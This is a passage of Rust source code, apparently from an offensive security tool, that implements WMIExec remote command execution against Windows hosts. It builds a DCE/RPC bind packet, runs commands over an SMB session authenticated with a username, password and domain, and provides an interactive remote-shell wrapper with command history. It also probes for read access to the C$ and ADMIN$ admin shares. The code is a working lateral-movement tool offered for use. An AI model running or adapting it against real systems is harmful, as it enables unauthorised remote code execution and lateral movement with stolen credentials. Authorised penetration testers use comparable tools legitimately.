    pkt.extend_from_slice(&1u32.to_le_bytes()); // num ctx items

    // Context item
    pkt.extend_from_slice(&0u16.to_le_bytes()); // ctx id
    pkt.extend_from_slice(&1u16.to_le_bytes()); // num transfer

    // Abstract: EPM
    pkt.extend_from_slice(&epm_uuid);
    pkt.extend_from_slice(&[0x03, 0x00, 0x00, 0x00]); // v3.0

    // Transfer: NDR
    pkt.extend_from_slice(&ndr_uuid);
    pkt.extend_from_slice(&[0x02, 0x00, 0x00, 0x00]); // v2.0

    // Fix frag length
    let len = pkt.len() as u16;
    pkt[8] = (len & 0xFF) as u8;
    pkt[9] = (len >> 8) as u8;

    pkt
}

/// Execute multiple commands and collect results
pub async fn exec_commands(session: &SmbSession, commands: &[&str]) -> Vec<WmiExecResult> {
    let mut results = Vec::new();

    for cmd in commands {
        match exec_command(session, cmd).await {
            Ok(r) => results.push(r),
            Err(e) => {
                warn!("WMIExec: Failed '{}': {e}", cmd);
                results.push(WmiExecResult {
                    target: session.target.clone(),
                    command: cmd.to_string(),
                    success: false,
                    output: format!("Error: {e}"),
                    return_code: None,
                });
            }
        }
    }

    results
}

/// Interactive shell wrapper for WMIExec
pub struct WmiExecShell<'a> {
    session: &'a SmbSession,
    config: WmiExecConfig,
    history: Vec<(String, String)>,
}

impl<'a> WmiExecShell<'a> {
    pub fn new(session: &'a SmbSession) -> Self {
        WmiExecShell {
            session,
            config: WmiExecConfig::default(),
            history: Vec::new(),
        }
    }

    pub fn with_config(session: &'a SmbSession, config: WmiExecConfig) -> Self {
        WmiExecShell {
            session,
            config,
            history: Vec::new(),
        }
    }

    pub async fn exec(&mut self, command: &str) -> Result<String> {
        let result = execute(self.session, command, &self.config).await?;
        self.history
            .push((command.to_string(), result.output.clone()));
        Ok(result.output)
    }

    pub fn history(&self) -> &[(String, String)] {
        &self.history
    }
}

// ═══════════════════════════════════════════════════════════
//  Executor Implementation
// ═══════════════════════════════════════════════════════════

pub struct WmiExecutor {
    creds: super::ExecCredentials,
}

impl WmiExecutor {
    pub fn new(creds: super::ExecCredentials) -> Self {
        Self { creds }
    }
}

#[async_trait::async_trait]
impl super::RemoteExecutor for WmiExecutor {
    fn method(&self) -> super::ExecMethod {
        super::ExecMethod::WmiExec
    }

    async fn execute(
        &self,
        target: &str,
        command: &str,
    ) -> crate::error::Result<super::ExecOutput> {
        info!("WmiExecutor: Executing command on {}", target);

        // Create SMB session
        let session = SmbSession::connect(
            target,
            &self.creds.username,
            &self.creds.password,
            &self.creds.domain,
        )
        .await?;

        // Execute via WMIExec
        let result = exec_command(&session, command).await?;

        Ok(super::ExecOutput {
            stdout: result.output,
            stderr: String::new(),
            exit_code: result
                .return_code
                .map(|rc| rc as i32)
                .or(Some(if result.success { 0 } else { 1 })),
            method: super::ExecMethod::WmiExec,
        })
    }

    async fn check_available(&self, target: &str) -> bool {
        // Check if we can connect to SMB and access admin shares
        match SmbSession::connect(
            target,
            &self.creds.username,
            &self.creds.password,
            &self.creds.domain,
        )
        .await
        {
            Ok(session) => {
                // Try to access C$ or ADMIN$ share
                session.check_share_read("C$").await || session.check_share_read("ADMIN$").await
            }
            Err(_) => false,
        }
    }
}
